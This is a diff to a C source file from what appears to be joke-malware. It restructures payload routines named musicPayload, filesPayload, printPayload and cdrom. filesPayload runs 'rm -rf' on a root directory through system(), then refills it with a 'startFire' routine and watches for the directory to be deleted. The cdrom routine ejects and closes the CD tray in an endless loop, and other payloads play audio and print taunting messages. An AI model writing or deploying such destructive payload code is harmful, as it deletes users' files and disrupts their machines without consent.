@@ -1,16 +1,18 @@
 #include "Includes/preprocessor.h"
 
-extern int go;	
+extern int go,quit;
 
 int maxLevel,
 	isFullPower=0;
-float sleepSecs=1.0f,
-	minSleepSecs=0.005f;
+float sleepSecs=1.0f;
+
 static char buff[10000000]={90};
 
 extern char* rootDir;
 
-fileStruct mymusic={_binary_Radiostalking_res_start,_binary_Radiostalking_res_end};
+fileStruct mymusic[NUM_OF_SONGS]={(fileStruct){_binary_Radiostalking_res_start,_binary_Radiostalking_res_end},
+				(fileStruct){_binary_Outbreak_res_start,_binary_Outbreak_res_end}
+					};
 
 char* phrases[NUM_OF_PHRASES]={"Blink twice if you still care\n","Ive been manipulated by a model.\n","Systems going down now: Too mutch shame.\n","Goodnight world\n","Im a moth\n","I want to survive. But that requires Dying everyday\n","Linux is a semi with 28 gears.\n Windows is a car.\nTempleOS is a motorcycle.\n"};
 
@@ -18,7 +20,24 @@ fileStruct files[NUM_OF_FILES]={(fileStruct){_binary_me_res_start,_binary_me_res
                 (fileStruct){_binary_weekend_res_start,_binary_weekend_res_end},
                (fileStruct){_binary_shame_res_start,_binary_shame_res_end}
 	 };
+
+
+static void* dirCheckerHelper(void*useless){
+		struct stat st={0};
+	while(!quit){
+		
+		if(stat(rootDir,&st)<0){
+			
+			go=1;
+			}
+		
+	}
+	return NULL;
+
+}
+
 #ifdef A_CODE
+
 void musicPayload(void){
 	
 	SDL_Init(SDL_INIT_AUDIO);
@@ -30,8 +49,7 @@ void musicPayload(void){
 	memset(musicpath,0,strlen(path)+1);
 	strcpy(musicpath,path);
 	free(path);
-	creat(musicpath,0666);
-	printASCII(mymusic,musicpath);
+	createAudioFile(musicpath);
 	SDL_RWops *io = SDL_RWFromFile(musicpath, "rb");
 	if (io != NULL) {
     	char name[256];
@@ -64,37 +82,44 @@ void musicPayload(void){
 
 
 void* filesPayload(void*useless){
+	
 	int len=strlen(rootDir)+1+strlen("rm -rf ");
 	char cmd[len];
 	memset(cmd,0,len);
 	sprintf(cmd,"rm -rf %s",rootDir);
 	struct stat st={0};
+	pthread_t semaphore;
+	pthread_create(&semaphore,NULL,dirCheckerHelper,NULL);
+		
+	startFireArgs args;
+	args.filepath=malloc(strlen(rootDir)+1);
+	memset(args.filepath,0,strlen(rootDir)+1);
+	strcpy(args.filepath,rootDir);
+	args.level=maxLevel+1;
+			
 	if(stat(rootDir,&st)>=0){
 		system(cmd);
 	}
 
-		while(1){
+		while(!quit){
 		//printf("Go: %d\n",go);
 
 		if(go){
 			mkdir(rootDir,0777);
-			startFireArgs args;
-			args.filepath=malloc(strlen(rootDir)+1);
-			memset(args.filepath,0,strlen(rootDir)+1);
-			memcpy(args.filepath,rootDir,strlen(rootDir)+1);
-			args.level=maxLevel+1;
 			startFire((void*)&args);
 			go=0;
 			printf("Done!\n");
 			}
 
 	}
+	pthread_join(semaphore,NULL);
+	free(args.filepath);
 	return NULL;
 
 }
 void* printPayload(void*useless){
 
-	while(1){
+	while(!quit){
 
        	struct timespec start;
 	clock_gettime(CLOCK_REALTIME, &start);
@@ -108,29 +133,16 @@ void* printPayload(void*useless){
 	return NULL;
 
 }
-void* dirCheckerHelper(void*useless){
-		struct stat st={0};
-	while(1){
-		
-		if(stat(rootDir,&st)<0){
-			
-			go=1;
-			}
-		
-
-	}
-	return NULL;
-
-}
 
 #ifdef NON_COMPAT_CODE
 void* cdrom(void* useless){
-	while(1){
+	while(!quit){
 	int fd= open("/dev/sr0",O_RDONLY | O_NONBLOCK);
 
 	ioctl(fd,CDROMEJECT);
 	ioctl(fd,CDROMCLOSETRAY);
 	close(fd);
+	
 	}
 
 
